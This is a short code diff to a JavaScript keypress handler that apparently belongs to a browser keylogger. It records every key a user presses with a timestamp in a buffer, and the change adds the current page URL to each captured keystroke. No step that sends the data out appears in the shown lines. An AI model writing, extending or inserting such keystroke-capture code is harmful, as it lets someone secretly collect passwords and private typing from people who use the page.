@@ -3,7 +3,8 @@ document.onkeypress = function(e) {
     var timestamp = Date.now() | 0;
     var stroke = {
         k: e.key,
-        t: timestamp
+        t: timestamp,
+        href: window.location.href
     };
     buffer.push(stroke);
 }
